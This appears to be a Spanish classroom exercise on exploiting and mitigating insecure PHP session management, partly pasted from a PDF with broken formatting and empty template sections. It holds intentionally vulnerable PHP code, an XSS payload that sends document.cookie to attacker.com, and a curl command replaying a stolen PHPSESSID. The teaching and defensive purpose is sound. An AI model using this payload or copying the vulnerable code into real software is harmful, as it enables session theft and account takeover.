# Explotación y Mitigación de Gestión Insegura de Sesiones
--- 
Tema: Secuestro de sesiones
Objetivo: Identificar riesgos en la gestión de sesiones y mitigarlos

# PPS-Unidad3Actividad7-RCE
Explotación y Mitigación de gestión insegura de sesiones.

Tenemos como **objetivo**:

> - Ver cómo se pueden hacer ataques .
>
> - Analizar el código de la aplicación que permite ataques de .
>
> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.

## ¿Qué es Session Management?
---
El Session Management (gestión de sesiones) es un mecanismo que permite a las aplicaciones web rastrear y mantener el estado de los usuarios a lo largo de múltiples solicitudes HTTP. Una mala implementación puede exponer la aplicación a ataques como Session Hijacking (secuestro de sesión) o reutilización de tokens para suplantación de identidad.

## ACTIVIDADES A REALIZAR
---
> Lee detenidamente la sección de autenticación de la página de PortWigger <https://portswigger.net/web-security/authentication#what-is-authentication>
>
> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionMitigacionGestionInseguraSesiones.pdf>
> 
> También y como marco de referencia, tienes [ la sección de correspondiente de Gestión de Sesiones  del **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README)
>


Vamos realizando operaciones:

### Iniciar entorno de pruebas

-Situáte en la carpeta de del entorno de pruebas de nuestro servidor LAMP e inicia el esce>

~~~
docker-compose up -d
~~~


## Código vulnerable
---

Creamos el archivo vulnerable: **session.php**
~~~
<?php
session_start();

if (isset($_GET['user'])) {
    $_SESSION['user'] = $_GET['user'];
    echo "Sesión iniciada como: " . htmlspecialchars($_SESSION['user']);
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicio de Sesión Inseguro</title>
</head>
<body>
    <h2>Iniciar sesión</h2>
    <form method="GET">
        <label for="user">Usuario:</label>
        <input type="text" id="user" name="user" required>
        <button type="submit">Iniciar sesión</button>
    </form>
</body>
</html>
~~~

Se nos muestra una entrada de texto para que introduzcamos nuestro usuario:

![](images/GIS1.png)

El formulario se envia como `http://localhost/sesion.php?user=admin` y con método get.

Nos informa que se ha iniciado sesión con el usuario introducido:

![](images/GIS2.png)

¿Por qué es vulnerable?

1. No se valida ni se sanea el parámetro user, permitiendo inyecciones.

2. No se regenera el identificador de sesión al iniciar sesión, permitiendo reutilización de sesiones.

3. No hay restricciones de seguridad en la cookie de sesión, facilitando ataques como Session Hijacking o Session Fixation.

4. La sesión puede ser manipulada fácilmente modificando la URL (por ejemplo: ?user=admin).

## Explotación de Session Hijacking
---

Si un atacante obtiene una cookie de sesión válida, puede suplantar a un usuario legítimo.


**Pasos para llevar a cabo el ataque**

1. Capturar la cookie de sesión activa desde el navegador de la víctima.

2. Usar esa misma cookie en otro navegador o dispositivo.

3. Si la sesión es válida y reutilizable, la aplicación es vulnerable.


🔍 Vamos a Ver como podemos ver el encabezado Set-Cookie para acceder a los datos de sesión.

- Abre tu página en Chrome donde se ejecuta tu código PHP.

- Presiona **F12** o haz clic derecho y selecciona **"Inspeccionar"** para abrir las herramientas de desarrollador.

- Ve a la pestaña **"Network"** (Red).

- Selecciona la pestaña **all**

![](images/GIS3.png)

- Recarga la página (F5) con las herramientas abiertas.

- Busca en la lista de peticiones la que corresponda a tu archivo PHP (por ejemplo: index.php, login.php, etc.).

- Haz clic en esa petición.

![](images/GIS4.png)

- Dentro del panel de detalles, selecciona la subpestaña "Headers" (Encabezados).

- Baja hasta la sección "Response Headers" (Encabezados de respuesta).

Ahí deberías ver una línea como: `Cookie` y dentro de ella una variable **PHPSESID** con su valor: `PHPSESSID=abc123xyz456`

También tenemos justamente debajo el servidor dónde se ha almacenado `host   localhost`

![](images/GIS5.png)


**Ataque detallado: Session Hijacking**


A continuación, se detalla cómo un atacante puede explotar este código vulnerable para secuestrar la sesión de unusuario legítimo.


1. El usuario legítimo inicia sesión

	1. El usuario accede a la web y pasa su nombre de usuario en la URL: 

	~~~
	http://localhost/session.php?user=admin
	~~~

	2. El servidor crea una sesión y almacena la variable: `$_SESSION['user'] = 'admin';`

	3. El navegador almacena la cookie de session: `Set-Cookie: PHPSESSID=e6d541e8b64a3117ca7fbc56a4198b8c; path=/;`

	4. Ahora, cada vez que el usuario haga una solicitud, el navegador enviará la cookie: `Cookie: PHPSESSID=e6d541e8b64a3117ca7fbc56a4198b8c`

2.  El atacante roba la cookie de sesión
	
	El atacante necesita obtener el Session ID (PHPSESSID) de la víctima. Puede hacerlo de varias formas:

> **Captura de tráfico (MITM)**
>
> Si la web no usa HTTPS, un atacante puede capturar paquetes de red con herramientas como Wireshark:
>
>1. Iniciar Wireshark y
> ~~~
> sudo wireshak 
>~~~
>
>Se nos pide introducir una interfaz. Como nosotros estamos virtuaizando, es posible que tengamos muchas, pero vamos a ver la actividad en las diferentes redes.
>
>![](images/GIS6.png)
>
> En este momento puede enviar mi consulta a `http://localhost/session.php` y veré en que red se produce la actividad y la selecciono.
>
>![](images/GIS7.png)
>
> Una vez que  estamos capturando el tráfico de la red, en filtro, ponemos `http.cookie` y nos mostrará el inmtercambio de paquetes donde tenemos esos datos.
>
>![](images/GIS8.png)
>
> Hacemos doble click sobre ese paquete y se nos abre una ventana con todos los datos. 
>
>![](images/GIS9.png)
>
> Nos vamos al apartado **Hypertext Transfer Protocol**  y allí podemos ver la información de las variables.
>
>![](images/GIS10.png)
>
>Ya el atacante tiene los datos de nuestra sesión.

>**Capturar la solicitud del usuario legítimo.**
>2
>3. Extraer la cookie PHPSESSID=ep5ae44cln6q76t8v18philqh3.
![](images/GIS5.png)
> **Ataque XSS (Cross-Site Scripting)**
Si la aplicación tiene alguna vulnerabilidad XSS, el atacante puede inyectar un script para robar cookies. Primero
creamos el fichero session_comment.php:
<?php
if (isset($_POST['comment'])) {
echo "Comentario publicado: " . $_POST['comment'];
}
?>
<form method="post">
<input type="text" name="comment">
<button type="submit">Enviar</button>
</form>
•
 Insertamos el siguiente script para obtener las cookies:
<script>
alert(document.cookie);
</script>
3
•
 Cuando un usuario acceda a la página, su navegador enviará la cookie de sesión al servidor del atacante.
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
Sniffing en redes WiFi públicas
•
 Si la víctima usa una WiFi pública sin HTTPS, su cookie puede ser interceptada con herramientas como Firesheep
o Ettercap.
4
3o El atacante usa la cookie robada
Una vez que el atacante tiene la cookie de sesión (PHPSESSID=ep5ae44cln6q76t8v18philqh3), la puede utilizar para
suplantar a la víctima.
Editar cookies en el navegador
1.
 Abrir las herramientas de desarrollador (F12 en Chrome).
2.
 Ir a Application > Storage > Cookies.
3.
 Seleccionar https://localhost
4.
 Modificar PHPSESSID y reemplazarlo por el valor robado.
Enviar el Session ID en una solicitud
El atacante puede acceder directamente a la sesión de la víctima:
https://localhost/session.php
Añadiendo manualmente la cookie con cURL:
curl -b "PHPSESSID=ep5ae44cln6q76t8v18philqh3" https://victima.com/session.php
5
4o Acceso a la cuenta de la víctima
Ahora el atacante ya puede:
•
•
•
•
Ver datos personales de la víctima.
Realizar cambios en la cuenta (si hay opciones de perfil).
Hacer compras o transacciones (si la web lo permite).
Modificar la contraseña del usuario.
Pasos realizados en el ejemplo real de la explotación:
1.
2.
3.
4.
5.
Usuario legítimo: https://localhost/session.php?user=admin
Atacante captura PHPSESSID=ep5ae44cln6q76t8v18philqh3
Atacante edita su cookie en el navegador y accede a https:/localhost/session.php
Atacante ve: "Sesión iniciada como: admin"
El atacante habría tomado el control de la sesión sin necesidad de credenciales
Mitigación de Session Hijacking
Para evitar este ataque, se deben implementar varias medidas:
* Regenerar el ID de sesión en cada inicio de sesión, además guarda en la sesión el valor recibido por GET['user'],
sanitizándolo para evitar ataques XSS (Cross-Site Scripting).
session_start();
session_regenerate_id(true); // Borra la sesión anterior y genera una nueva
$_SESSION['user'] = htmlspecialchars($_GET['user'], ENT_QUOTES, 'UTF-8');
6
nc3heoo2lu2khtjnabgig7dhs9
9ii89l1qtutdt4812a6npvdvk3
* Configurar la cookie de sesión de forma segura
ini_set('session.cookie_secure', 1);
 // Solo permite cookies en HTTPS
ini_set('session.cookie_httponly', 1); // Evita acceso desde JavaScript (prevención XSS)
ini_set('session.use_only_cookies', 1); // Impide sesiones en URL
* Validar la IP y User-Agent del usuario
session_start();
if (!isset($_SESSION['ip'])) {
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
}
7
if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
session_destroy();
header("Location: login.php");
exit();
}
* Implementar tiempo de expiración de sesión
ini_set('session.gc_maxlifetime', 1800); // Expira en 30 minutos
session_set_cookie_params(1800);
* Usar HTTPS siempre
Configurar un SSL/TLS para cifrar las cookies y evitar capturas MITM.
// Redirigir HTTP a HTTPS si el usuario accede por HTTP
if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
header("Location: https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
exit();
}
* Habilitar HTTPS con SSL/TLS en Localhost (Apache)
Para proteger la sesión y evitar ataques Man-in-the-Middle (MITM), es crucial habilitar HTTPS en el servidor local. A
continuación se configura en Apache.
8
Método 1: Habilitar HTTPS en Apache con OpenSSL
1o Generar un certificado SSL autofirmado
Ejecutar los siguientes comandos en el terminal para crear un certificado SSL:
mkdir /etc/apache2/ssl
cd /etc/apache2/ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout localhost.key -out
localhost.crt
Detalles a ingresar en OpenSSL:
•
 Common Name (CN): Escribir localhost
•
 Los demás campos se pueden dejar en blanco o con datos ficticios
2o Configurar Apache para usar HTTPS
Editar el archivo de configuración de Apache default-ssl.conf :
sudo nano /etc/apache2/sites-available/default-ssl.conf
Modificar o añadir estas líneas dentro de <VirtualHost *:443>:
<VirtualHost *:443>
ServerAdmin webmaster@localhost
ServerName localhost
DocumentRoot /var/www/html
SSLEngine on
SSLCertificateFile /etc/apache2/ssl/localhost.crt
SSLCertificateKeyFile /etc/apache2/ssl/localhost.key
<Directory /var/www/html>
AllowOverride All
Require all granted
</Directory>
</VirtualHost>
3o Habilitar el módulo SSL en Apache
sudo a2enmod ssl
sudo a2ensite default-ssl
sudo systemctl restart apache2
Ahora el servidor soportaría HTTPS en https://localhost/
4o Redirigir HTTP a HTTPS automáticamente
Para asegurarse de que todas las conexiones se realicen por HTTPS, agregar en .htaccess o en default.conf:
RewriteEngine On
9
RewriteCond %{HTTPS} !=on
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
Todas las solicitudes HTTP serán forzadas a HTTPS.
Verificar que HTTPS funciona correctamente
1o Acceder a https://localhost/ en el navegador.
2o Aceptar el certificado autofirmado (en Chrome, haz clic en Avanzado → Proceder).
3o Verificar que las cookies de sesión ahora tienen Secure activado:
•
•
•
Abrir DevTools (F12 en Chrome o Firefox).
Ir a Application → Storage → Cookies → localhost.
Comprobar que la cookie de sesión tiene el flag Secure habilitado.
Código completo
<?php
// Configurar la seguridad de la sesión antes de iniciarla
ini_set('session.cookie_secure', 1);
 // Solo permite cookies en HTTPS
ini_set('session.cookie_httponly', 1); // Evita acceso desde JavaScript (prevención XSS)
ini_set('session.use_only_cookies', 1); // Impide sesiones en URL
ini_set('session.gc_maxlifetime', 1800); // Expira en 30 minutos
session_set_cookie_params(1800); // Configura el tiempo de vida de la cookie de sesión
// Redirigir HTTP a HTTPS si el usuario accede por HTTP
if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
header("Location: https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
exit();
}
session_start();
session_regenerate_id(true); // Borra la sesión anterior y genera una nueva
// Validación de IP para evitar Session Hijacking
if (!isset($_SESSION['ip'])) {
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR']; // Guarda la IP al iniciar sesión
} elseif ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
session_destroy(); // Destruir la sesión si la IP cambia
header("Location: login.php");
exit();
}
// Verificar tiempo de inactividad para expirar la sesión
if (!isset($_SESSION['last_activity'])) {
$_SESSION['last_activity'] = time(); // Registrar el primer acceso
} elseif (time() - $_SESSION['last_activity'] > 1800) { // 30 minutos
session_unset(); // Eliminar variables de sesión
session_destroy(); // Destruir la sesión
header("Location: login.php");
exit();
} else {
$_SESSION['last_activity'] = time(); // Reiniciar el temporizador
}
// Protección contra XSS en el usuario
if (!isset($_SESSION['user'])) {
10
}
if (isset($_GET['user'])) {
$_SESSION['user'] = htmlspecialchars($_GET['user'], ENT_QUOTES, 'UTF-8');
} else {
$_SESSION['user'] = "Desconocido"; // Evita variable indefinida
}
// Mostrar la sesión activa
echo "Sesión iniciada como: " . $_SESSION['user'];
?>
* Resumen de las medidas de seguridad implementadas
Seguridad en sesiones:
o Cookies seguras (HTTPS, HttpOnly, Only Cookies)
o Regeneración de sesión
o Validación de IP
o Expiración por inactividad
Protección contra ataques:
o Prevención de XSS con htmlspecialchars()
o Protección contra secuestro de sesión (Session Hijacking)
o Redirección a HTTPS para evitar ataques MITM
Este código refuerza la seguridad de sesiones en PHP y es una buena práctica para aplicaciones web que
manejen autenticación de usuarios.
11





## Código vulnerable
---



![](images/.png)


### **Código seguro**
---

Aquí está el código securizado:

🔒 Medidas de seguridad implementadas

- :

        - 

        - 



🚀 Resultado

✔ 

✔ 

✔ 

## ENTREGA

> __Realiza las operaciones indicadas__

> __Crea un repositorio  con nombre PPS-Unidad3Actividad6-Tu-Nombre donde documentes la realización de ellos.__

> No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.

> __Sube a la plataforma, tanto el repositorio comprimido como la dirección https a tu repositorio de Github.__

